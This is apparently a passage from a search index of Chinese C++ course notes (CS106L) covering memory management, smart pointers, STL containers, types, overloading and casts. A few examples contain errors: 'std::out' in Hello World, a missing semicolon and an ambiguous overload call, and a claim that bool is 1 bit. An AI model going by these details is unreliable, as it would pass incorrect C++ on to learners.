\u64cd\u4f5c\u7b26\u8fd4\u56de\u7c7b\u578b\u4e0e\u5bf9\u8c61\u4e25\u683c\u5339\u914d\uff1b<code>malloc</code> \u8fd4\u56de <code>void*</code> \uff0c\u9700\u8981\u624b\u52a8\u5f3a\u5236\u8f6c\u6362</li> <li><code>new</code> \u5206\u914d\u5931\u8d25\u8fd4\u56de <code>std::bad_alloc</code> \u5f02\u5e38\uff1b<code>malloc</code> \u5206\u914d\u5931\u8d25\u8fd4\u56de <code>NULL</code></li> <li><code>new</code> \u548c <code>delete</code> \u4f1a\u6b63\u786e\u8c03\u7528\u5bf9\u8c61\u7684 <code>Ctor</code> \u6216 <code>Dtor</code></li> </ul> <p><code>new</code> \u64cd\u4f5c\u7b26\u7684\u5e95\u5c42\u901a\u5e38\u4e5f\u662f\u7528 <code>malloc</code> \u5b9e\u73b0\u7684</p> <p>\u4e0d\u8981\u5bf9\u540c\u4e00\u5757\u5185\u5b58 <code>delete</code> \u4e24\u6b21\uff1b\u4f46\u662f\u5bf9 <code>nullptr</code> \u4f7f\u7528 <code>delete</code> \u662f\u5b89\u5168\u7684</p>"},{"location":"Accumulation/CS106L/Addition/#smart-pointers","title":"Smart Pointers","text":"<p>\u624b\u52a8\u4f7f\u7528 <code>new</code> \u548c <code>delete</code> \u5e38\u5e38\u5bfc\u81f4\u5185\u5b58\u6cc4\u6f0f\u6216\u60ac\u6302\u6307\u9488\uff0c\u667a\u80fd\u6307\u9488\u7684 <code>smart</code> \u4f53\u73b0\u5728\uff1a</p> <ul> <li>\u81ea\u52a8\u56de\u6536\u8d44\u6e90: \u5728\u751f\u547d\u5468\u671f\u7ed3\u675f\u540e\u667a\u80fd\u6307\u9488\u81ea\u52a8\u91ca\u653e\u8d44\u6e90</li> <li>\u6b63\u786e\u8c03\u7528: \u6839\u636e\u6307\u9488\u7c7b\u578b\uff0c\u81ea\u52a8\u9009\u62e9 <code>delete</code> \u6216 <code>delete[]</code></li> <li>\u989d\u5916\u9650\u5236: \u4f8b\u5982\u5f3a\u5236\u8981\u6c42\u667a\u80fd\u6307\u9488\u4e0d\u4e3a\u7a7a</li> </ul> <ul> <li><code>std::unique_ptr</code> \u5047\u8bbe\u81ea\u5df1\u662f\u5bf9\u8c61\u7684\u552f\u4e00\u6240\u6709\u8005\uff0c\u5b83\u4f1a\u5728\u81ea\u5df1\u6790\u6784\u65f6\u81ea\u52a8\u8c03\u7528\u5408\u9002\u7684 <code>delete</code><ul> <li><code>unique_ptr</code> \u7c7b\u4e2d\u62f7\u8d1d\u6784\u9020\u548c\u62f7\u8d1d\u8d4b\u503c\u51fd\u6570\u5747\u88ab\u6807\u8bb0\u4e3a <code>delete</code>\uff0c\u5373\u5b83\u4e0d\u80fd\u88ab\u62f7\u8d1d\u6216\u8d4b\u503c\uff1b\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>std::move</code> \u8f6c\u79fb\u6240\u6709\u6743</li> <li>\u5982\u679c\u4e00\u4e2a\u7c7b\u4e2d\u542b\u6709\u975e\u9759\u6001\u7684\u4e0d\u53ef\u62f7\u8d1d\u6210\u5458\uff0c\u8fd9\u4e2a\u7c7b\u4e5f\u65e0\u6cd5\u88ab\u62f7\u8d1d</li> </ul> </li> </ul> <pre><code>#include &lt;iostream&gt;\n#include &lt;memory&gt;\n\nstruct Foo {\n    Foo() { std::cout &lt;&lt; \"Foo created\\n\"; }\n    ~Foo() { std::cout &lt;&lt; \"Foo destroyed\\n\"; }\n    void say() { std::cout &lt;&lt; \"Hello from Foo\\n\"; }\n};\n\nint main() {\n    std::unique_ptr&lt;Foo&gt; p1 = std::make_unique&lt;Foo&gt;();\n    p1-&gt;say();\n\n    // std::unique_ptr&lt;Foo&gt; p2 = p1;      \u274c \u9519\u8bef\uff0c\u4e0d\u80fd\u590d\u5236\n    std::unique_ptr&lt;Foo&gt; p2 = std::move(p1);  // \u2705 \u8f6c\u79fb\u6240\u6709\u6743\n\n    if (!p1) std::cout &lt;&lt; \"p1 is now null\\n\";\n}\n</code></pre> <ul> <li>\u591a\u4e2a <code>std::shared_ptr</code> \u53ef\u4ee5\u5171\u4eab\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5176\u5185\u90e8\u4f1a\u7ef4\u62a4\u5f15\u7528\u8ba1\u6570\uff0c\u5f53\u6700\u540e\u4e00\u4e2a <code>shared_ptr</code> \u88ab\u9500\u6bc1\u65f6\uff0c\u8d44\u6e90\u624d\u88ab\u91ca\u653e<ul> <li>\u53ef\u4ee5\u88ab\u6d45\u62f7\u8d1d\uff0c\u88ab\u62f7\u8d1d\u7684\u503c\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61</li> <li>\u63a5\u53d7\u53f3\u503c\u5f15\u7528 <code>unique_ptr</code>\uff0c\u5c06\u72ec\u5360\u6240\u6709\u6743\u8f6c\u6362\u4e3a\u5171\u4eab\u6240\u6709\u6743</li> </ul> </li> </ul> <pre><code>#include &lt;iostream&gt;\n#include &lt;memory&gt;\n\nstruct MyClass {\n    MyClass()  { std::cout &lt;&lt; \"MyClass created\\n\"; }\n    ~MyClass() { std::cout &lt;&lt; \"MyClass destroyed\\n\"; }\n};\n\nint main() {\n    std::unique_ptr&lt;MyClass&gt; uptr = std::make_unique&lt;MyClass&gt;();\n\n    std::shared_ptr&lt;MyClass&gt; sptr = std::move(uptr);  // \u8f6c\u79fb\u6240\u6709\u6743\u5230 shared_ptr\n\n    std::cout &lt;&lt; \"uptr is \" &lt;&lt; (uptr ? \"not null\" : \"null\") &lt;&lt; \"\\n\";\n    std::cout &lt;&lt; \"sptr use_count: \" &lt;&lt; sptr.use_count() &lt;&lt; \"\\n\";\n}\n</code></pre> <p>Double Free</p> <pre><code>T* p = ...;\nstd::shared_ptr&lt;T&gt; a(p);\nstd::shared_ptr&lt;T&gt; b(p);\n// runtime error: double free\n// =============================\nauto a = std::make_shared&lt;T&gt;();\nstd::shared_ptr&lt;T&gt; b(a.get());\n// runtime error: double free\n// =============================\nauto a = std::make_shared&lt;T&gt;();\nstd::shared_ptr&lt;T&gt; b(a);\nstd::shared_ptr&lt;T&gt; c;\nc = b;\n// Good\n</code></pre>"},{"location":"Accumulation/CS106L/Addition/#some-stl","title":"Some STL..","text":""},{"location":"Accumulation/CS106L/Addition/#stack","title":"STACK","text":"<p>\u57fa\u672c\u64cd\u4f5c\uff1a\u4f7f\u7528 stack \u6765\u5339\u914d\u62ec\u53f7</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;stack&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nbool is_balance(string s)\n{\n    stack&lt;char&gt; st;\n\n    for (char c : s)\n    {\n        if (c == '(' || c == '[' || c == '{')\n            st.push(c);\n        else if (c == ')' || c == ']' || c == '}')\n        {\n            if (st.empty())\n                return false;\n            char top = st.top();\n            st.pop(); // pop \u662f void\uff0c\u4e0d\u8fd4\u56de pop \u51fa\u7684\u5143\u7d20\n            if ((c == ')' &amp;&amp; top != '(') ||\n                (c == ']' &amp;&amp; top != '[') ||\n                (c == '}' &amp;&amp; top != '{'))\n                return false;\n        }\n    }\n    return st.empty();\n}\n\nint main()\n{\n    string a = \"a{b(c[d]e)f}\";\n    string b = \"a{b(c[d]e)f\";\n\n    cout &lt;&lt; \"a: \" &lt;&lt; (is_balance(a) ? \"Balanced\" : \"Not Balanced\") &lt;&lt; endl;\n    cout &lt;&lt; \"b: \" &lt;&lt; (is_balance(b) ? \"Balanced\" : \"Not Balanced\") &lt;&lt; endl;\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u5728\u5df2\u6709\u5176\u4ed6\u5bb9\u5668\uff08\u6bd4\u5982 <code>vector</code>\uff0c<code>deque</code>\uff09\u7b49\u5bb9\u5668\u7684\u524d\u63d0\u4e0b\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u5c31\u80fd\u5199\u51fa\u81ea\u5df1\u7684\u4e00\u4e2a <code>stack</code>\uff1a</p> <pre><code>template &lt;typename T&gt;\nclass Stack\n{\npublic:\n    virtual T&amp; top() = 0;\n    virtual bool empty() = 0;\n    virtual size_t size() = 0;\n    virtual void push(T) = 0;\n    virtual void pop() = 0;\n};\n\ntemplate &lt;typename T&gt;\nclass VectorStack : public Stack&lt;T&gt;\n{\npublic:\n    T&amp; top() override { return c.back(); }\n    bool empty() override { return c.empty(); }\n    size_t size() override { return c.size(); }\n    void push(T t) override { c.push_back(t); }\n    void pop() override { c.pop_back(); }\nprivate:\n    vector&lt;T&gt; c;\n};\n</code></pre> <p>\u5176\u4e2d\uff0c\u4e0a\u9762\u7684 <code>Stack</code> \u7c7b\u4ec5\u5145\u5f53 adapter \u4f5c\u7528\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5728\u4e0b\u9762\u5199\u5165\u57fa\u4e8e\u5176\u5b83\u7ed3\u6784\u5b9e\u73b0\u7684 stack \u7c7b\u3002</p>"},{"location":"Accumulation/CS106L/Addition/#map","title":"MAP","text":"<p><code>map</code> \u7684\u4e0b\u6807\u5f15\u7528\u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u56e0\u6b64\u8981\u9632\u6b62\u4e71\u7528</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;map&gt;\n#include &lt;string&gt;\n\nint main()\n{\n    std::map &lt;std::string, int&gt; price;\n\n    // \u63d2\u5165\u5143\u7d20\n    price[\"apple\"] = 1;\n    price[\"banana\"] = 2;\n    price[\"orange\"] = 3;\n\n    // \u8fed\u4ee3\u904d\u5386\u8bbf\u95ee\n    for (const auto&amp; item : price) {\n        std::cout &lt;&lt; item.first &lt;&lt; \": $\" &lt;&lt; item.second &lt;&lt; std::endl;\n    }\n\n    std::string item;\n    int total = 0;\n    while(std::cin &gt;&gt; item) {\n        if (item == \"quit\")\n            break;\n        // \u5982\u679c item \u4e0d\u5728 map \u4e2d\uff0cprice[item] \u4f1a\u63d2\u5165\u4e00\u4e2a\u9ed8\u8ba4\u503c\uff0c\u9020\u6210\u6c61\u67d3\n        if (price.find(item) != price.end())\n            total += price[item]; \n        else\n            std::cout &lt;&lt; \"Item not found.\" &lt;&lt; std::endl;\n    }\n\n    std::cout &lt;&lt; \"Total price: $\" &lt;&lt; total &lt;&lt; std::endl;\n}\n</code></pre>"},{"location":"Accumulation/CS106L/C%2B%2B/","title":"C++","text":""},{"location":"Accumulation/CS106L/C%2B%2B/#a-brief-introduction-of-c","title":"A brief introduction of c++","text":"<p> \u7ea6 5697 \u4e2a\u5b57  970 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 41 \u5206\u949f</p> <ul> <li>C++ \u5411\u540e\u517c\u5bb9\u4f4e\u7ea7\u8bed\u8a00\uff0c\u5982\u4f7f\u7528 <code>asm(...);</code> \u6765\u6267\u884c\u6c47\u7f16\u8bed\u8a00</li> <li>C++23 \u6307\u7684\u662f23\u5e74</li> <li>C++ \u7f16\u7a0b\u8303\u5f0f<ul> <li>Object-Oriented Programming</li> <li>Procedural Programming</li> <li>Generic Programming</li> </ul> </li> </ul>"},{"location":"Accumulation/CS106L/C%2B%2B/#c-basics","title":"C++ Basics","text":"<p>The first program in C++:</p> <pre><code>#include &lt;iostream&gt;\n\nint main()\n{\n    std::out &lt;&lt; \"Hello, World!\" &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> <p>C++\u6807\u51c6\u6a21\u677f\u5e93 Standard Template Library, STL \u662f\u4e00\u5957\u529f\u80fd\u5f3a\u5927\u7684C++\u6a21\u677f\u7c7b\u548c\u51fd\u6570\u7684\u96c6\u5408\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u901a\u7528\u7684\u3001\u53ef\u590d\u7528\u7684\u7b97\u6cd5\u548c\u6570\u636e\u7ed3\u6784\uff0c\u5176\u6838\u5fc3\u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u91cd\u8981\u7ec4\u4ef6\uff1a</p> \u7ec4\u4ef6 \u63cf\u8ff0 \u5bb9\u5668 Containers \u5bb9\u5668\u662f STL \u4e2d\u6700\u57fa\u672c\u7684\u7ec4\u4ef6\u4e4b\u4e00\uff0c\u63d0\u4f9b\u4e86\u5404\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u5305\u62ec\u5411\u91cf\uff08vector\uff09\u3001\u94fe\u8868\uff08list\uff09\u3001\u961f\u5217\uff08queue\uff09\u3001\u6808\uff08stack\uff09\u3001\u96c6\u5408\uff08set\uff09\u3001\u6620\u5c04\uff08map\uff09\u7b49 \u7b97\u6cd5 Algorithms STL \u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u7b97\u6cd5\uff0c\u7528\u4e8e\u5bf9\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u5404\u79cd\u64cd\u4f5c\uff0c\u5305\u62ec\u6392\u5e8f\u3001\u641c\u7d22\u3001\u590d\u5236\u3001\u79fb\u52a8\u3001\u53d8\u6362\u7b49\u3002\u8fd9\u4e9b\u7b97\u6cd5\u5728\u4f7f\u7528\u65f6\u4e0d\u9700\u8981\u5173\u5fc3\u5bb9\u5668\u7684\u5177\u4f53\u7c7b\u578b\uff0c\u53ea\u9700\u8981\u6307\u5b9a\u8981\u64cd\u4f5c\u7684\u8303\u56f4\u5373\u53ef \u8fed\u4ee3\u5668 Iterators \u8fed\u4ee3\u5668\u7528\u4e8e\u904d\u5386\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\uff0c\u5141\u8bb8\u4ee5\u7edf\u4e00\u7684\u65b9\u5f0f\u8bbf\u95ee\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\uff0c\u800c\u4e0d\u7528\u5173\u5fc3\u5bb9\u5668\u7684\u5185\u90e8\u5b9e\u73b0\u7ec6\u8282\u3002STL \u63d0\u4f9b\u4e86\u968f\u673a\u8bbf\u95ee\u8fed\u4ee3\u5668\u3001\u53cc\u5411\u8fed\u4ee3\u5668\u3001\u524d\u5411\u8fed\u4ee3\u5668\u548c\u8f93\u5165\u8f93\u51fa\u8fed\u4ee3\u5668\u7b49\u591a\u79cd\u7c7b\u578b\u7684\u8fed\u4ee3\u5668 \u51fd\u6570\u5bf9\u8c61 Function Objects \u51fd\u6570\u5bf9\u8c61\u662f\u53ef\u4ee5\u50cf\u51fd\u6570\u4e00\u6837\u8c03\u7528\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u4e8e\u7b97\u6cd5\u4e2d\u7684\u5404\u79cd\u64cd\u4f5c\u3002STL \u63d0\u4f9b\u4e86\u4e00\u5143\u51fd\u6570\u5bf9\u8c61\u3001\u4e8c\u5143\u51fd\u6570\u5bf9\u8c61\u3001\u8c13\u8bcd\u7b49\u591a\u79cd\u51fd\u6570\u5bf9\u8c61 \u9002\u914d\u5668 Adapters \u9002\u914d\u5668\u7528\u4e8e\u5c06\u4e00\u79cd\u5bb9\u5668\u6216\u8fed\u4ee3\u5668\u9002\u914d\u6210\u53e6\u4e00\u79cd\u5bb9\u5668\u6216\u8fed\u4ee3\u5668\uff0c\u4ee5\u6ee1\u8db3\u7279\u5b9a\u7684\u9700\u6c42\u3002STL \u63d0\u4f9b\u4e86\u6808\u9002\u914d\u5668\uff08stack adapter\uff09\u3001\u961f\u5217\u9002\u914d\u5668\uff08queue adapter\uff09\u548c\u4f18\u5148\u961f\u5217\u9002\u914d\u5668\uff08priority queue adapter\uff09\u7b49\u591a\u79cd\u9002\u914d\u5668 <p>C++ \u8fd8\u5f15\u5165\u4e86\u547d\u540d\u7a7a\u95f4\u6982\u5ff5\u4f5c\u4e3a\u9644\u52a0\u4fe1\u606f\u4ee5\u533a\u5206\u4e0d\u540c\u5e93\u4e2d\u7684\u540c\u540d\u51fd\u6570\u3001\u7c7b\u3001\u53d8\u91cf\u7b49\u3002\u672c\u8d28\u4e0a\uff0c\u547d\u540d\u7a7a\u95f4\u5c31\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u8303\u56f4\u3002\u800c <code>std</code> \u4e3a STL \u7684\u547d\u540d\u7a7a\u95f4\u3002</p> <p>\u5728\u67d0\u4e9b\u7b80\u5355\u4ee3\u7801\u4e2d\u6211\u4eec\u80fd\u591f\u770b\u5230 <code>using namespace std;</code> \u6307\u4ee4\uff0c\u6765\u6307\u5b9a\u540e\u7eed\u7684\u4ee3\u7801\u90fd\u4f7f\u7528 <code>std</code> \u4f5c\u4e3a\u547d\u540d\u7a7a\u95f4\uff0c\u4f46\u8fd9\u4e0d\u662f\u4e00\u4e2a\u597d\u7684\u4ee3\u7801\u4e60\u60ef\uff0c\u6211\u4eec\u8981\u5c3d\u91cf\u907f\u514d\u3002</p> <p>\u4f7f\u7528 <code>using namespace std::cout</code> \uff0c\u5219\u63a5\u4e0b\u6765\u53ea\u6709 <code>cout</code> \u6307\u4ee4\u524d\u9762\u4e0d\u9700\u8981\u52a0\u547d\u540d\u7a7a\u95f4</p>"},{"location":"Accumulation/CS106L/C%2B%2B/#types","title":"Types","text":"<pre><code>#include &lt;string&gt;\n\nint val = 5;         // 4 bytes = 32 bits (usually)\nchar ch = 'F';       // 1 byte  = 8 bits  (usually)\nfloat dVal1 = 5.0;   // 4 bytes = 32 bits\ndouble dVal2 = 5.0;  // 8 bytes = 64 bits\nbool bVal = true;    // 1 bit\nstd::string str = \"Nimisora\"; // C++ \u5b57\u7b26\u4e32\u672b\u5c3e\u4e0d\u7528 '\\0'\n</code></pre> <p>C++ is a statically typed language, \u5373\u4efb\u4f55\u53d8\u91cf\u3001\u51fd\u6570\u5728\u8fd0\u884c\u524d\u90fd\u4f1a\u83b7\u5f97\u4e00\u4e2a Types\u3002</p> <p>Python\u5c31\u5c5e\u4e8eDynamically Typed\uff0c\u5176\u53d8\u91cf\u548c\u51fd\u6570\u7684\u7c7b\u578b\u90fd\u89c6\u5f53\u524d\u503c\u800c\u5b9a</p> <p>\u8fd9\u4e5f\u662f\u56e0\u4e3aPython\u5c5e\u4e8e\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u5176\u8fd0\u884c\u65f6\u4f1a\u4e00\u884c\u4e00\u884c\u8bfb\u53d6\u5e76\u786e\u5b9a\u7c7b\u578b\uff1b\u800cC++\u5c5e\u4e8e\u7f16\u8bd1\u578b\u8bed\u8a00\uff0c\u5176\u7c7b\u578b\u9700\u8981\u5728\u7f16\u8bd1\u65f6\u5c31\u786e\u5b9a\u3002</p> <p>\u5728 C++ \u4e2d\uff0c\u4f60\u4e0d\u80fd\u91cd\u590d\u5b9a\u4e49\u591a\u4e2a\u5b8c\u5168\u76f8\u540c\u7684\u51fd\u6570\uff0c\u4e0d\u8fc7\u5f53\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u540c\u6837\u6216\u7c7b\u4f3c\u529f\u80fd\u7684\u51fd\u6570\u7684\u591a\u4e2a\u7248\u672c\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u901a\u8fc7\u66f4\u6539\u51fd\u6570\u7c7b\u578b\u6216\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\u6765\u5b9e\u73b0 Overload \u8fbe\u6210\u591a\u7248\u672c\uff1a</p> <pre><code>int half(int x)\n{\n    cout &lt;&lt; \"1\" &lt;&lt; endl;\n    return x/2;\n}\ndouble half(double x)\n{\n    cout &lt;&lt; \"2\" &lt;&lt; endl;\n    return x/2;\n}\nint half(int x, int divisor = 2) // default parameter values\n{\n    cout &lt;&lt; \"3\" &lt;&lt; endl\n    return x/divisor;\n}\n\nhalf(3);     // use version 1, return 1 \nhalf(3.0);   // use version 2, return 1.5\nhalf(3, 3);  // use version 3, return 1\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\uff0cC++\u8fd8\u652f\u6301 <code>auto</code> \u5173\u952e\u5b57\uff0c\u5b83\u4f1a\u8ba9\u7f16\u8bd1\u5668\u81ea\u52a8\u8bc6\u522b\u8be5\u53d8\u91cf\u6216\u51fd\u6570\u7684\u7c7b\u578b\u3002</p> <p>\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u5bf9\u4e00\u4e2a\u53d8\u91cf\u8d4b\u503c\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u5462\uff1f</p> <p>\u5f53\u6211\u4eec\u5c1d\u8bd5\u76f4\u63a5\u521d\u59cb\u5316\uff0c\u7a0b\u5e8f\u5e76\u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u662f\u4f1a\u6309\u7167\u4e00\u5b9a\u89c4\u5219\u5c06\u521d\u59cb\u503c\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7c7b\u578b\u7684\u503c\uff1a</p> <pre><code>int numOne = 12.5;\nint numTwo(12.5);\n\ncout &lt;&lt; \"numOne is: \" &lt;&lt; numOne &lt;&lt; endl;\ncout &lt;&lt; \"numTwo is: \" &lt;&lt; numTwo &lt;&lt; endl;\n\n/*Output:\nnumOne is: 12\nnumTwo is: 12\n*/\n</code></pre> <p>\u5728 C++11 \u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u82b1\u62ec\u53f7\u8fdb\u884c Uniform Initialization \uff0c\u8fd9\u5c06\u544a\u8bc9\u7f16\u8bd1\u5668\u6ce8\u610f\u521d\u59cb\u503c\u548c\u53d8\u91cf\u7684\u7c7b\u578b\uff1a</p> <pre><code>int numOne = {12.5};\n// or int numOne{12.5};\n\n/*Error Message:\n\u9519\u8bef\uff1anarrowing conversion of \u20181.25e+1\u2019 from \u2018double\u2019 to \u2018int\u2019 [-Wnarrowing]\n    |    int num = {12.5};\n*/\n</code></pre> <p>\u82b1\u62ec\u53f7\u7684\u610f\u4e49\u5728\u4e8e\u66f4\u597d\u7684\u5b89\u5168\u6027</p> <p>\u9664\u4e86\u4e0a\u8ff0\u4f7f\u7528\u65b9\u6cd5\u5916\uff0c\u82b1\u62ec\u53f7\u5728 C++ \u8d4b\u521d\u503c\u4e2d\u65e0\u5904\u4e0d\u5728\uff0c\u4f8b\u5982\u4e0b\u5217\u4ee3\u7801\u5b9e\u73b0\u5bf9 <code>map</code> \u548c <code>Vector</code> \u7684 Uniform Initialization\uff1a</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nint main() {\n    // uniform initialization of map &amp; vector\n    std::map&lt;std::string, int&gt; ages {\n        {\"Amahamiu\", 18},\n        {\"Inuisana\", 17},\n        {\"Nimisora\", 16}\n    };\n    std::vector&lt;int&gt; numbers = {1,2,3,4,5};\n\n    // Accessing map elements\n    std::cout &lt;&lt; \"Amaha's age: \" &lt;&lt; ages[\"Amahamiu\"] &lt;&lt; endl;\n    std::cout &lt;&lt; \"Inui's age: \" &lt;&lt; ages.at(\"Inuisana\") &lt;&lt; endl;\n\n    // Accessing vector elements\n    for (int num : numbers)\n        std::cout &lt;&lt; num &lt;&lt; \" \";\n\n    return 0;\n}\n</code></pre> <p><code>typename</code></p> <p>\u5173\u952e\u5b57 <code>typename</code> \u7528\u4e8e\u5411\u7f16\u8bd1\u5668\u8868\u660e\u67d0\u4e2a\u6807\u8bc6\u7b26\u662f\u4e00\u4e2a\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u53d8\u91cf\u6216\u5176\u5b83\u5b9e\u4f53\uff0c\u5b83\u4e3b\u8981\u5e94\u7528\u5728\u6a21\u677f\u7f16\u7a0b\u4e2d\u3002\u4f8b\u5982\uff1a</p> <pre><code>template&lt;class ForwardIt&gt;\nForwardIt min_elem(ForwardIt first, ForwardIt last)\n{\n  return min_elem(first, last, std::less&lt;typename  std::iterator_traits&lt;ForwardIt&gt;::value_type&gt;());\n}\n\ntemplate&lt;class ForwardIt, class Compare&gt;\nForwardIt min_elem(ForwardIt first, ForwardIt last, Compare comp)\n{\n  if (first == last)\n    return first;\n\n  ForwardIt smallest = first++;\n  for (; first != last; ++first) {\n    if (comp(*first, *smallest)) {\n      smallest = first;\n    }\n  }\n  return smallest;\n}\n</code></pre> <p>Named Cast \u662f C++ \u652f\u6301\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u56db\u79cd\u5206\u522b\u6709\u4e0d\u540c\u7684\u7528\u9014\uff1a</p> \u8f6c\u6362\u7c7b\u578b \u4f5c\u7528\u4e0e\u7528\u9014 \u662f\u5426\u6709\u8fd0\u884c\u65f6\u68c0\u67e5 \u53ef\u8fdb\u884c\u7684\u8f6c\u6362\u793a\u4f8b \u4f7f\u7528\u573a\u666f\u4e0e\u6ce8\u610f\u70b9 <code>static_cast&lt;T&gt;(\u2026)</code> \u2705 \u7f16\u8bd1\u671f\u7c7b\u578b\u68c0\u67e5\u2705 \u7528\u4e8e\u76f8\u5173\u7c7b\u578b\u4e4b\u95f4\u7684\u5b89\u5168\u8f6c\u6362\uff08\u975e\u591a\u6001\uff09 \u274c \u65e0\u8fd0\u884c\u65f6\u68c0\u67e5 \u57fa\u672c\u7c7b\u578b\u95f4\uff08\u5982 <code>int</code>\u2192<code>double</code>\uff09\u7c7b\u5c42\u6b21\u65e0\u591a\u6001\u5173\u7cfb\u65f6\u5411\u4e0a/\u5411\u4e0b\u8f6c\u6362 \u7528\u4e8e\u975e\u591a\u6001\u7684\u6307\u9488/\u5f15\u7528\u8f6c\u6362\uff0c\u6216\u57fa\u672c\u7c7b\u578b\u95f4\u3002\u4e0b\u884c\u8f6c\u6362\u9700\u8c28\u614e\uff0c\u65e0\u6cd5\u68c0\u67e5\u76ee\u6807\u662f\u5426\u771f\u5b9e\u5bf9\u8c61\u3002 <code>dynamic_cast&lt;T&gt;(\u2026)</code> \u2705 \u652f\u6301\u591a\u6001\u7c7b\u578b\u5b89\u5168\u4e0b\u884c\u8f6c\u6362\uff08\u9700\u57fa\u7c7b\u6709 <code>virtual</code>\uff09\u2705 \u8fd0\u884c\u65f6\u7c7b\u578b\u68c0\u67e5 \u2705 \u6709\u8fd0\u884c\u65f6\u68c0\u67e5 <code>c++&lt;br&gt;Base* b = \u2026;&lt;br&gt;Derived* d = dynamic_cast&lt;Derived*&gt;(b);&lt;br&gt;</code> \u591a\u6001\u573a\u666f\u4e0b\u60f3\u4ece\u57fa\u7c7b\u6307\u9488/\u5f15\u7528\u5b89\u5168\u8f6c\u4e3a\u6d3e\u751f\u7c7b\u3002\u5931\u8d25\u8fd4\u56de <code>nullptr</code>\uff08\u6307\u9488\uff09\u6216\u629b <code>std::bad_cast</code>\uff08\u5f15\u7528\uff09\u3002 <code>const_cast&lt;T&gt;(\u2026)</code> \u2705 \u53bb\u9664\u6216\u6dfb\u52a0 <code>const</code>/<code>volatile</code> \u4fee\u9970 \u274c \u65e0\u8fd0\u884c\u65f6\u68c0\u67e5 <code>c++&lt;br&gt;const int* p = \u2026; &lt;br&gt;int* q = const_cast&lt;int*&gt;(p);&lt;br&gt;</code> \u7528\u4e8e\u4fee\u6539\u6389\u5bf9\u8c61\u7684\u5e38\u91cf\u5c5e\u6027\uff1b\u82e5\u76ee\u6807\u672c\u8eab\u771f\u4e3a\u5e38\u91cf\uff0c\u4fee\u6539\u4f1a\u9020\u6210\u672a\u5b9a\u4e49\u884c\u4e3a\u3002 <code>reinterpret_cast&lt;T&gt;(\u2026)</code> \u2705 \u8fdb\u884c\u201c\u6700\u4f4e\u5c42\u201d\u6bd4\u7279\u91cd\u89e3\u91ca\u8f6c\u6362\uff0c\u4e0d\u6539\u53d8\u6bd4\u7279\u6a21\u5f0f \u274c \u65e0\u8fd0\u884c\u65f6\u68c0\u67e5 <code>c++&lt;br&gt;int* p;&lt;br&gt;char* c = reinterpret_cast&lt;char*&gt;(p);&lt;br&gt;</code>\u6216\u8005\u4ece <code>long</code> \u2192 \u6307\u9488 \u7b49\u3002 \u7528\u4e8e\u5e95\u5c42\u6307\u9488\u4e0e\u6574\u6570\u4e4b\u95f4\u3001\u4e0d\u540c\u6307\u9488\u7c7b\u578b\u4e4b\u95f4\u6309\u4f4d\u91cd\u89e3\u91ca\u3002\u51e0\u4e4e\u4e0d\u5b89\u5168\uff0c\u4ec5\u5728\u6781\u7aef\u573a\u666f\uff08\u5982\u786c\u4ef6\u6620\u5c04\u3001\u5e8f\u5217\u5316\uff09\u4e0b\u4f7f\u7528\u3002 <p>\u301023-24 Final\u3011 \u4e0b\u9762\u54ea\u4e2a\u4ee3\u7801\u4f1a\u7f16\u8bd1\u9519\u8bef\uff1fD</p> <pre><code>// A. static_cast \u53ef\u4ee5\u7528\u5728\u57fa\u7c7b\u548c\u5b50\u7c7b\u7684\u4e92\u76f8\u8f6c\u6362\uff0c\u65e0\u7f16\u8bd1\u9519\u8bef\uff0c\u4f46\u662f\u5b9e\u9645\u8fd0\u884c\u65f6\u6709\u53ef\u80fd\u51fa\u9519\nstruct U {};\nstruct V : public U {};\nstruct W : public U {};\nint main()\n{\n    U* p = new V;\n    W* q = static_cast&lt;W*&gt;(p);\n    return q == nullptr;\n}\n\n// B. dynamic_cast \u53ea\u80fd\u7528\u5728\u57fa\u7c7b\u548c\u5b50\u7c7b\u662f\u591a\u6001\u7684\u65f6\u5019\uff0c\u5373\u57fa\u7c7b\u4e00\u5b9a\u8981\u6709 virtual \u51fd\u6570\u3002\n// \u4f46\u662f\u5b9e\u9645\u4e0a\u53ea\u8981 dynamic_cast&lt;target&gt;(expression) \u4e2d expression \u662f\u591a\u6001\u7c7b\u578b\u5373\u53ef\uff0c\u53ea\u4e0d\u8fc7\u6b64\u4f8b\u4e2d W \u548c U \u65e0\u7ee7\u627f\u5173\u7cfb\uff0c\u4f1a\u8fd4\u56de\u7a7a\u6307\u9488\nstruct U { virtual void foo() {} };\nstruct V : public U {};\nstruct W {};\nint main()\n{\n    U* p = new V;\n    W* q = dynamic_cast&lt;W*&gt;(p);\n    return q 